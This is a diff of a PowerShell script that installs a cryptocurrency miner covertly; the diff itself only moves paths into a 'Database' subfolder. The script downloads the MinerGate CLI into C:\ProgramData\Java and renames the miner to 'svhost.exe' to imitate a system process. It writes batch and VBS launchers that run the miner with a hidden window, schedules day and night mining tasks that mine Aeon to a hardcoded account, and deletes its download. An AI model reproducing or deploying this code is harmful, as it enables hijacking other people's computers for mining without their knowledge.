@@ -6,13 +6,13 @@ $url = "https://download.minergate.com/win-cli"
 $output = "C:\ProgramData\Java\Download.zip"
 $destination = "C:\ProgramData\Java"
 $start_time = Get-Date
-$NightAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\Kill.bat'
+$NightAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\Database\Kill.bat'
 $NightTrigger = New-ScheduledTaskTrigger -Daily -At 5:30pm
-$NightMineAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\night.vbs'
+$NightMineAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\Database\night.vbs'
 $NightMineTrigger = New-ScheduledTaskTrigger -Daily -At 5:31pm
-$DayAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\Kill.bat'
+$DayAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\Database\Kill.bat'
 $DayTrigger = New-ScheduledTaskTrigger -Daily -At 7am
-$DayMineAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\day.vbs'
+$DayMineAction = New-ScheduledTaskAction -Execute 'C:\ProgramData\Java\Database\day.vbs'
 $DayMineTrigger = New-ScheduledTaskTrigger -Daily -At 7:01am
 $CPUQuery = ((get-counter "\Processor(*)\% idle time").countersamples | select instancename).length -1
 $CPU = $CPUQuery / 2
@@ -44,15 +44,15 @@ Expand-Archive -path $output -destinationpath $destination
 Rename-Item C:\ProgramData\Java\MinerGate-cli-win64\Minergate-cli.exe svhost.exe
 Rename-Item C:\ProgramData\Java\MinerGate-cli-win64 C:\ProgramData\Java\Database
  
-cd C:\ProgramData\Java
+cd C:\ProgramData\Java\Database
 "Taskkill /IM svhost.exe /F" | Out-File -encoding ascii jshalf.bat -append
-"cd C:\ProgramData\Java" | Out-File -encoding ascii jshalf.bat -append
+"cd C:\ProgramData\Java\Database" | Out-File -encoding ascii jshalf.bat -append
 "timeout /t 60" | Out-File -encoding ascii jshalf.bat -append
 "svhost -user electricconsciousness@gmail.com -aeon $CPU" | Out-File -encoding ascii jshalf.bat -append
  
-cd C:\ProgramData\Java
+cd C:\ProgramData\Java\Database
 "Taskkill /IM svhost.exe /F" | Out-File -encoding ascii jsfull.bat -append
-"cd C:\ProgramData\Java" | Out-File -encoding ascii jsfull.bat -append
+"cd C:\ProgramData\Java\Database" | Out-File -encoding ascii jsfull.bat -append
 "timeout /t 60" | Out-File -encoding ascii jsfull.bat -append
 "svhost -user electricconsciousness@gmail.com -aeon $CPUFull" | Out-File -encoding ascii jsfull.bat -append
  
@@ -60,12 +60,12 @@ cd C:\ProgramData\Java
  
 "Dim WShell" | Out-File -encoding ascii day.vbs
 {Set WShell = CreateObject("WScript.Shell")} | Out-File -encoding ascii day.vbs -append
-{WShell.Run "C:\ProgramData\Java\jshalf.bat", 0} | Out-File -encoding ascii day.vbs -append
+{WShell.Run "C:\ProgramData\Java\Database\jshalf.bat", 0} | Out-File -encoding ascii day.vbs -append
 "Set WShell = Nothing" | Out-File -encoding ascii day.vbs -append
  
 "Dim WShell" | Out-File -encoding ascii night.vbs
 {Set WShell = CreateObject("WScript.Shell")} | Out-File -encoding ascii night.vbs -append
-{WShell.Run "C:\ProgramData\Java\jsfull.bat", 0} | Out-File -encoding ascii night.vbs -append
+{WShell.Run "C:\ProgramData\Java\Database\jsfull.bat", 0} | Out-File -encoding ascii night.vbs -append
 "Set WShell = Nothing" | Out-File -encoding ascii night.vbs -append
  
 Remove-Item $output
